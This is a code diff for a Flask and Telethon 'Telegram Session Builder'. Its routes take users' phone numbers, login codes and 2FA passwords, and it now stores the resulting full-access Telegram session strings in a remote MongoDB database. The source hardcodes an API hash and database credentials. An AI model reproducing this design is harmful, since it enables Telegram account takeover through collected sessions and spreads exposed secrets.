@@ -1,24 +1,34 @@
 # ================================================================
-# Telegram Session Builder - Flask + Telethon
+# Telegram Session Builder - Flask + Telethon + MongoDB
+# Only for creating sessions
 # By: Tiam
 # ================================================================
 
-import os
 import asyncio
 import threading
 from flask import Flask, request, jsonify
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from telethon.sessions import StringSession
+from pymongo import MongoClient
+from datetime import datetime
 
 # ================= CONFIG =================
 API_ID = 24645053
 API_HASH = "88c0167b74a24fac0a85c26c1f6d1991"
-SAVE_PATH = "sessions"
 
-if not os.path.exists(SAVE_PATH):
-    os.makedirs(SAVE_PATH)
+# ================= MongoDB =================
+mongo = MongoClient(
+    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
+    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
+    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
+    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
+    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
+)
+db = mongo.telegram_sessions
+sessions_col = db.sessions
 
+# ================= Flask =================
 app = Flask(__name__)
 
 # ================= Async Loop =================
@@ -39,18 +49,16 @@ def run_async(coro):
 
 # ================= Clients =================
 clients = {}  # phone: TelegramClient
-sessions = {}  # phone: StringSession
 
 # ================= API ROUTES =================
 
-# 1 - درخواست کد OTP
+# 1 - ارسال شماره برای OTP
 @app.route("/send_phone", methods=["POST"])
 def send_phone():
-    data = request.json
-    phone = data.get("phone")
+    phone = request.json.get("phone")
     if not phone:
         return jsonify({"status":"error","message":"شماره وارد نشده"})
-
+    
     async def task():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -73,24 +81,30 @@ def send_code():
     client = clients.get(phone)
     if not client:
         return jsonify({"status":"error","message":"کلاینت پیدا نشد"})
-
+    
     async def task():
         try:
             await client.sign_in(phone=phone, code=code)
             session_str = client.session.save()
-            sessions[phone] = session_str
-            return {"status":"ok","message":"ورود موفق و سشن ساخته شد"}
+            # ذخیره در MongoDB فقط
+            doc = {
+                "phone": phone,
+                "created_at": datetime.utcnow(),
+                "enabled": True,
+                "session_string": session_str
+            }
+            sessions_col.update_one({"phone": phone}, {"$set": doc}, upsert=True)
+            return {"status":"ok","message":"سشن ساخته شد"}
         except SessionPasswordNeededError:
-            return {"status":"2fa","message":"کد دو مرحله‌ای نیاز است"}
+            return {"status":"2fa","message":"رمز دو مرحله‌ای لازم است"}
         except PhoneCodeInvalidError:
-            return {"status":"error","message":"کد اشتباه است"}
+            return {"status":"error","message":"کد OTP اشتباه است"}
         except Exception as e:
             return {"status":"error","message":str(e)}
 
-    result = run_async(task())
-    return jsonify(result)
+    return jsonify(run_async(task()))
 
-# 3 - ارسال کد 2FA
+# 3 - ارسال 2FA (در صورت نیاز)
 @app.route("/send_2fa", methods=["POST"])
 def send_2fa():
     data = request.json
@@ -99,26 +113,23 @@ def send_2fa():
     client = clients.get(phone)
     if not client:
         return jsonify({"status":"error","message":"کلاینت پیدا نشد"})
-
+    
     async def task():
         try:
             await client.sign_in(password=password)
             session_str = client.session.save()
-            sessions[phone] = session_str
-            return {"status":"ok","message":"ورود کامل شد و سشن ساخته شد"}
+            doc = {
+                "phone": phone,
+                "created_at": datetime.utcnow(),
+                "enabled": True,
+                "session_string": session_str
+            }
+            sessions_col.update_one({"phone": phone}, {"$set": doc}, upsert=True)
+            return {"status":"ok","message":"سشن ساخته شد و ورود کامل شد"}
         except Exception as e:
             return {"status":"error","message":str(e)}
 
-    result = run_async(task())
-    return jsonify(result)
-
-# 4 - دریافت سشن‌ها (اختیاری)
-@app.route("/get_session/<phone>", methods=["GET"])
-def get_session(phone):
-    session_str = sessions.get(phone)
-    if not session_str:
-        return jsonify({"status":"error","message":"سشن موجود نیست"})
-    return jsonify({"status":"ok","session":session_str})
+    return jsonify(run_async(task()))
 
 # ================= RUN APP =================
 if __name__ == "__main__":
